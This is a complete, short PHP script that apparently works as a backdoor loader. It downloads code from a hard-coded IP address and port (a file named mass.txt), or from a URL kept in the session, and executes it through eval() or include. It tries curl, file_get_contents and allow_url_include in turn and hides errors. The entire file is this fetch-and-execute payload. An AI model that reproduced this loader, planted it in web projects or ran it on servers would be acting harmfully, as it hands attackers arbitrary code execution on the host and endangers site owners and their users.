<?php
session_start();
$url = $_SESSION['ts_url'] ?? 'http://198.38.85.163:8050/mass.txt';
$code = null;

switch (true) {
    case function_exists('curl_init'):
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5
        ]);
        $code = curl_exec($ch);
        curl_close($ch);
        if ($code) @eval("?>$code");
        break;

    case ($code = @file_get_contents($url)):
        @eval("?>$code");
        break;

    case @ini_get('allow_url_include'):
        @include($url);
        break;
}
?>
